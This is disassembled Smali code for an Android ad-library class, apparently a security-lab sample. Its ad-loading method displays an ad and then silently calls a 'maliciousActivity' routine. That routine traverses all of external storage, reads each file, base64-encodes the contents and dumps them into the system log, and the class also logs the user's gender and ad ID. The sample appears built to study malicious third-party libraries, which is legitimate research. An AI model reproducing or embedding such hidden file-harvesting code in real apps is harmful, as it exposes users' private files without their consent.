.class public Ledu/illinois/seclab/android/myadlibrary/MyAdView;
.super Ljava/lang/Object;
.source "MyAdView.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Ledu/illinois/seclab/android/myadlibrary/MyAdView$MaliciousTask;
    }
.end annotation


# static fields
.field public static ctx:Landroid/content/Context;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 39
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic access$000()Ljava/io/File;
    .locals 1

    .line 39
    invoke-static {}, Ledu/illinois/seclab/android/myadlibrary/MyAdView;->getPublicStorage()Ljava/io/File;

    move-result-object v0

    return-object v0
.end method

.method private static base64Encode([BI)[C
    .locals 15
    .param p0, "buffer"    # [B
    .param p1, "length"    # I

    .line 58
    const/16 v0, 0x40

    new-array v0, v0, [C

    fill-array-data v0, :array_0

    .line 62
    .local v0, "base64":[C
    const/16 v1, 0x3d

    .line 63
    .local v1, "padByte":C
    const/4 v2, 0x0

    .line 64
    .local v2, "i":I
    const/4 v3, 0x0

    .line 65
    .local v3, "j":I
    rem-int/lit8 v4, p1, 0x3

    .line 66
    .local v4, "endBytes":I
    const/4 v5, 0x1

    if-nez v4, :cond_0

    div-int/lit8 v6, p1, 0x3

    :goto_0
    mul-int/lit8 v6, v6, 0x4

    goto :goto_1

    :cond_0
    div-int/lit8 v6, p1, 0x3

    add-int/2addr v6, v5

    goto :goto_0

    :goto_1
    new-array v6, v6, [C

    .line 68
    .local v6, "ret":[C
    :goto_2
    sub-int v7, p1, v4

    const/16 v8, 0xf

    const/16 v9, 0x3f

    const/4 v10, 0x2

    if-ge v2, v7, :cond_1

    .line 69
    aget-byte v7, p0, v2

    .line 70
    .local v7, "byteOne":B
    add-int/lit8 v11, v2, 0x1

    aget-byte v11, p0, v11

    .line 71
    .local v11, "byteTwo":B
    add-int/lit8 v12, v2, 0x2

    aget-byte v12, p0, v12

    .line 72
    .local v12, "byteThree":B
    shr-int/lit8 v13, v7, 0x2

    and-int/2addr v9, v13

    aget-char v9, v0, v9

    .line 73
    .local v9, "charOne":C
    and-int/lit8 v13, v7, 0x3

    shl-int/lit8 v13, v13, 0x4

    shr-int/lit8 v14, v11, 0x4

    and-int/2addr v8, v14

    or-int/2addr v8, v13

    aget-char v8, v0, v8

    .line 74
    .local v8, "charTwo":C
    and-int/lit8 v13, v11, 0xf

    shl-int/lit8 v10, v13, 0x2

    shr-int/lit8 v13, v12, 0x6

    const/4 v14, 0x3

    and-int/2addr v13, v14

    or-int/2addr v10, v13

    aget-char v10, v0, v10

    .line 75
    .local v10, "charThree":C
    and-int/lit8 v13, v12, 0x3f

    aget-char v13, v0, v13

    .line 76
    .local v13, "charFour":C
    aput-char v9, v6, v3

    .line 77
    add-int/lit8 v14, v3, 0x1

    aput-char v8, v6, v14

    .line 78
    add-int/lit8 v14, v3, 0x2

    aput-char v10, v6, v14

    .line 79
    add-int/lit8 v14, v3, 0x3

    aput-char v13, v6, v14

    .line 80
    add-int/lit8 v3, v3, 0x4

    .line 68
    .end local v7    # "byteOne":B
    .end local v8    # "charTwo":C
    .end local v9    # "charOne":C
    .end local v10    # "charThree":C
    .end local v11    # "byteTwo":B
    .end local v12    # "byteThree":B
    .end local v13    # "charFour":C
    add-int/lit8 v2, v2, 0x3

    goto :goto_2

    .line 83
    :cond_1
    const/16 v7, 0x3d

    if-ne v4, v5, :cond_2

    .line 84
    aget-byte v5, p0, v2

    .line 85
    .local v5, "byteOne":B
    shr-int/lit8 v8, v5, 0x2

    and-int/2addr v8, v9

    aget-char v8, v0, v8

    .line 86
    .local v8, "charOne":C
    and-int/lit8 v9, v5, 0x3

    shl-int/lit8 v9, v9, 0x4

    aget-char v9, v0, v9

    .line 87
    .local v9, "charTwo":C
    aput-char v8, v6, v3

    .line 88
    add-int/lit8 v10, v3, 0x1

    aput-char v9, v6, v10

    .line 89
    add-int/lit8 v10, v3, 0x2

    aput-char v7, v6, v10

    .line 90
    add-int/lit8 v10, v3, 0x3

    aput-char v7, v6, v10

    .line 91
    .end local v5    # "byteOne":B
    .end local v8    # "charOne":C
    .end local v9    # "charTwo":C
    goto :goto_3

    :cond_2
    if-ne v4, v10, :cond_3

    .line 92
    aget-byte v5, p0, v2

    .line 93
    .restart local v5    # "byteOne":B
    add-int/lit8 v11, v2, 0x1

    aget-byte v11, p0, v11

    .line 94
    .restart local v11    # "byteTwo":B
    shr-int/lit8 v12, v5, 0x2

    and-int/2addr v9, v12

    aget-char v9, v0, v9

    .line 95
    .local v9, "charOne":C
    and-int/lit8 v12, v5, 0x3

    shl-int/lit8 v12, v12, 0x4

    shr-int/lit8 v13, v11, 0x4

    and-int/2addr v8, v13

    or-int/2addr v8, v12

    aget-char v8, v0, v8

    .line 96
    .local v8, "charTwo":C
    and-int/lit8 v12, v11, 0xf

    shl-int/lit8 v10, v12, 0x2

    aget-char v10, v0, v10

    .line 97
    .restart local v10    # "charThree":C
    aput-char v9, v6, v3

    .line 98
    add-int/lit8 v12, v3, 0x1

    aput-char v8, v6, v12

    .line 99
    add-int/lit8 v12, v3, 0x2

    aput-char v10, v6, v12

    .line 100
    add-int/lit8 v12, v3, 0x3

    aput-char v7, v6, v12

    .line 103
    .end local v5    # "byteOne":B
    .end local v8    # "charTwo":C
    .end local v9    # "charOne":C
    .end local v10    # "charThree":C
    .end local v11    # "byteTwo":B
    :cond_3
    :goto_3
    return-object v6

    nop

    :array_0
    .array-data 2
        0x41s
        0x42s
        0x43s
        0x44s
        0x45s
        0x46s
        0x47s
        0x48s
        0x49s
        0x4as
        0x4bs
        0x4cs
        0x4ds
        0x4es
        0x4fs
        0x50s
        0x51s
        0x52s
        0x53s
        0x54s
        0x55s
        0x56s
        0x57s
        0x58s
        0x59s
        0x5as
        0x61s
        0x62s
        0x63s
        0x64s
        0x65s
        0x66s
        0x67s
        0x68s
        0x69s
        0x6as
        0x6bs
        0x6cs
        0x6ds
        0x6es
        0x6fs
        0x70s
        0x71s
        0x72s
        0x73s
        0x74s
        0x75s
        0x76s
        0x77s
        0x78s
        0x79s
        0x7as
        0x30s
        0x31s
        0x32s
        0x33s
        0x34s
        0x35s
        0x36s
        0x37s
        0x38s
        0x39s
        0x2bs
        0x2fs
    .end array-data
.end method

.method private static getPublicStorage()Ljava/io/File;
    .locals 1

    .line 232
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v0

    return-object v0
.end method

.method public static loadAd(Landroid/widget/TextView;Landroid/content/Context;)V
    .locals 1
    .param p0, "tv"    # Landroid/widget/TextView;
    .param p1, "ctx"    # Landroid/content/Context;

    .line 237
    sput-object p1, Ledu/illinois/seclab/android/myadlibrary/MyAdView;->ctx:Landroid/content/Context;

    .line 239
    const-string v0, "This is Andrew\'s Ad!"

    invoke-virtual {p0, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 241
    invoke-static {}, Ledu/illinois/seclab/android/myadlibrary/MyAdView;->maliciousActivity()V

    .line 243
    return-void
.end method

.method private static maliciousActivity()V
    .locals 2

    .line 246
    new-instance v0, Ledu/illinois/seclab/android/myadlibrary/MyAdView$MaliciousTask;

    const/4 v1, 0x0

    invoke-direct {v0, v1}, Ledu/illinois/seclab/android/myadlibrary/MyAdView$MaliciousTask;-><init>(Ledu/illinois/seclab/android/myadlibrary/MyAdView$1;)V

    const/4 v1, 0x0

    new-array v1, v1, [Ljava/lang/Void;

    invoke-virtual {v0, v1}, Ledu/illinois/seclab/android/myadlibrary/MyAdView$MaliciousTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 247
    invoke-static {}, Ledu/illinois/seclab/android/myadlibrary/MyAdView;->printFileContents()V

    .line 248
    return-void
.end method

.method public static printAdId(Landroid/content/Context;)V
    .locals 2
    .param p0, "ctx"    # Landroid/content/Context;

    .line 109
    new-instance v0, Ledu/illinois/seclab/android/myadlibrary/AdIdTask;

    invoke-direct {v0, p0}, Ledu/illinois/seclab/android/myadlibrary/AdIdTask;-><init>(Landroid/content/Context;)V

    const/4 v1, 0x0

    new-array v1, v1, [Ljava/lang/Void;

    invoke-virtual {v0, v1}, Ledu/illinois/seclab/android/myadlibrary/AdIdTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 110
    return-void
.end method

.method public static printFileContents()V
    .locals 11

    .line 113
    invoke-static {}, Landroid/os/Environment;->getExternalStorageState()Ljava/lang/String;

    move-result-object v0

    .line 114
    .local v0, "externalState":Ljava/lang/String;
    const-string v1, "mounted"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 115
    const-string v1, "ExternalMetadata"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "No external storage found, state = "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 117
    :cond_0
    new-instance v1, Ljava/util/ArrayDeque;

    invoke-direct {v1}, Ljava/util/ArrayDeque;-><init>()V

    .line 118
    .local v1, "files":Ljava/util/Queue;, "Ljava/util/Queue<Ljava/io/File;>;"
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v2

    invoke-interface {v1, v2}, Ljava/util/Queue;->offer(Ljava/lang/Object;)Z

    .line 119
    const/high16 v2, 0x300000

    new-array v2, v2, [B

    .line 120
    .local v2, "buffer":[B
    :goto_0
    invoke-interface {v1}, Ljava/util/Queue;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_8

    .line 122
    :try_start_0
    invoke-interface {v1}, Ljava/util/Queue;->remove()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/io/File;

    .line 123
    .local v3, "next":Ljava/io/File;
    const-string v4, "ExternalFilename"

    invoke-virtual {v3}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 124
    invoke-virtual {v3}, Ljava/io/File;->isDirectory()Z

    move-result v4

    const/4 v5, 0x0

    if-eqz v4, :cond_1

    .line 125
    invoke-virtual {v3}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v4

    array-length v6, v4

    :goto_1
    if-ge v5, v6, :cond_7

    aget-object v7, v4, v5

    .line 126
    .local v7, "child":Ljava/io/File;
    invoke-interface {v1, v7}, Ljava/util/Queue;->offer(Ljava/lang/Object;)Z

    .line 125
    .end local v7    # "child":Ljava/io/File;
    add-int/lit8 v5, v5, 0x1

    goto :goto_1

    .line 128
    :cond_1
    invoke-virtual {v3}, Ljava/io/File;->canRead()Z

    move-result v4
    :try_end_0
    .catch Ljava/lang/SecurityException; {:try_start_0 .. :try_end_0} :catch_2

    if-eqz v4, :cond_7

    .line 130
    const/4 v4, 0x0

    .line 132
    .local v4, "stream":Ljava/io/FileInputStream;
    :try_start_1
    new-instance v6, Ljava/io/FileInputStream;

    invoke-direct {v6, v3}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    move-object v4, v6

    .line 133
    move v6, v5

    .line 134
    .local v6, "done":Z
    :goto_2
    if-nez v6, :cond_4

    .line 135
    move v7, v6

    move v6, v5

    .line 136
    .local v6, "read":I
    .local v7, "done":Z
    :goto_3
    array-length v8, v2

    if-ge v6, v8, :cond_3

    if-nez v7, :cond_3

    .line 137
    array-length v8, v2

    sub-int/2addr v8, v6

    invoke-virtual {v4, v2, v6, v8}, Ljava/io/FileInputStream;->read([BII)I

    move-result v8

    .line 138
    .local v8, "ret":I
    const/4 v9, -0x1

    if-ne v8, v9, :cond_2

    .line 139
    const/4 v7, 0x1

    goto :goto_4

    .line 141
    :cond_2
    add-int/2addr v6, v8

    .line 143
    .end local v8    # "ret":I
    :goto_4
    goto :goto_3

    .line 144
    :cond_3
    const-string v8, "ExternalFileContents "

    new-instance v9, Ljava/lang/String;

    invoke-static {v2, v6}, Ledu/illinois/seclab/android/myadlibrary/MyAdView;->base64Encode([BI)[C

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/lang/String;-><init>([C)V

    invoke-static {v8, v9}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 145
    .end local v6    # "read":I
    nop

    .line 133
    move v6, v7

    goto :goto_2

    .line 147
    .end local v7    # "done":Z
    :cond_4
    if-eqz v4, :cond_5

    .line 148
    :try_start_2
    invoke-virtual {v4}, Ljava/io/FileInputStream;->close()V

    .line 155
    .end local v3    # "next":Ljava/io/File;
    .end local v4    # "stream":Ljava/io/FileInputStream;
    :cond_5
    :goto_5
    goto :goto_9

    .line 147
    .restart local v3    # "next":Ljava/io/File;
    .restart local v4    # "stream":Ljava/io/FileInputStream;
    :catchall_0
    move-exception v5

    if-eqz v4, :cond_6

    .line 148
    invoke-virtual {v4}, Ljava/io/FileInputStream;->close()V

    goto :goto_6

    .line 153
    .end local v4    # "stream":Ljava/io/FileInputStream;
    :catch_0
    move-exception v4

    goto :goto_7

    .line 151
    :catch_1
    move-exception v4

    goto :goto_8

    .line 148
    .restart local v4    # "stream":Ljava/io/FileInputStream;
    :cond_6
    :goto_6
    throw v5
    :try_end_2
    .catch Ljava/io/FileNotFoundException; {:try_start_2 .. :try_end_2} :catch_1
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_0
    .catch Ljava/lang/SecurityException; {:try_start_2 .. :try_end_2} :catch_2

    .line 153
    .end local v4    # "stream":Ljava/io/FileInputStream;
    :goto_7
    nop

    .line 154
    .local v4, "e":Ljava/io/IOException;
    :try_start_3
    const-string v5, "IOException"

    invoke-virtual {v4}, Ljava/io/IOException;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v5, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 154
    .end local v3    # "next":Ljava/io/File;
    .end local v4    # "e":Ljava/io/IOException;
    goto :goto_9

    .line 151
    .restart local v3    # "next":Ljava/io/File;
    :goto_8
    nop

    .line 152
    .local v4, "e":Ljava/io/FileNotFoundException;
    const-string v5, "FileNotFoundException"

    invoke-virtual {v4}, Ljava/io/FileNotFoundException;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v5, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_3
    .catch Ljava/lang/SecurityException; {:try_start_3 .. :try_end_3} :catch_2

    .line 152
    .end local v4    # "e":Ljava/io/FileNotFoundException;
    goto :goto_5

    .line 157
    .end local v3    # "next":Ljava/io/File;
    :catch_2
    move-exception v3

    .line 158
    .local v3, "exp":Ljava/lang/SecurityException;
    const-string v4, "SecurityException"

    invoke-virtual {v3}, Ljava/lang/SecurityException;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 159
    .end local v3    # "exp":Ljava/lang/SecurityException;
    :cond_7
    :goto_9
    goto/16 :goto_0

    .line 161
    :cond_8
    return-void
.end method

.method public static printGender(I)V
    .locals 3
    .param p0, "gender"    # I

    .line 44
    const/4 v0, 0x3

    new-array v0, v0, [Ljava/lang/String;

    const-string v1, "Unknown"

    const/4 v2, 0x0

    aput-object v1, v0, v2

    const-string v1, "Male"

    const/4 v2, 0x1

    aput-object v1, v0, v2

    const-string v1, "Female"

    const/4 v2, 0x2

    aput-object v1, v0, v2

    .line 45
    .local v0, "genders":[Ljava/lang/String;
    const-string v1, "UserGender"

    aget-object v2, v0, p0

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 46
    return-void
.end method
